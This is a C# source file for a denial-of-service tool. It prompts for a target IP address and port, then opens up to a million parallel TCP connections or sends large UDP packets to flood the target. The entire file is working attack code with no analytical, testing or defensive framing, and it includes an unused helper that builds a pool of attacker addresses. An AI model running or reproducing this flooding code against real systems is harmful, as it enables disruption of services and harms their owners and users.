using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using ConsoleApplication;

public static class Dos 
{
    public static List<IPEndPoint> IpPool = new List<IPEndPoint>();
    public static IPAddress TargetIp {get; set;}
    public static int TargetPort {get; set;}
    
    public static void Init()
    {
        C.Write("Enter Target IP : ");
        TargetIp = IPAddress.Parse(C.Read());
        C.Write("Enter Target Port : ");
        TargetPort = int.Parse(C.Read());
        //GenerateAttackerIps();
    }

    public static void TcpFloodAttack()
    {
        Init();
        int counter = 0;
        Parallel.For(0,1000000, (index) => 
        {
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try{
                C.Inline($"New TCP SYN Attempt to {TargetIp} Attemps: {++counter} ");
                s.Connect(new IPEndPoint(TargetIp, TargetPort));
                if(s.Connected)
                {
                    C.Inline("Connection Successful");
                } 
                s.Dispose();
            }
            catch (System.Exception e){ 
                //C.Write(e.Message);    
                s.Dispose(); 
                s = null;
            }
        });
    }

    public static void UdpFloodAttack()
    {
        Init();
        byte[] randomData = new Byte[7800]; 
        int counter = 0;
        Parallel.For(0,1000000, (index) => 
        {
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            try{
                C.Inline($"New UDP Connection Attempt to {TargetIp} PacketsSent: {++counter} ");
                s.Connect(new IPEndPoint(TargetIp, TargetPort));
                if(s.Connected)
                {
                    C.Inline("Sending Data");
                    s.Send(randomData);
                } 
                s.Dispose();
            }
            catch (System.Exception e){
                //C.Write(e.Message);
                s.Dispose();
                s = null;
            }
        });
    }

    public static void GenerateAttackerIps()
    {
        for(int i = 1; i < 255; i++)
        {
            IpPool.Add(new IPEndPoint(IPAddress.Parse($"192.168.1.{i}"),80));
        }
    }
}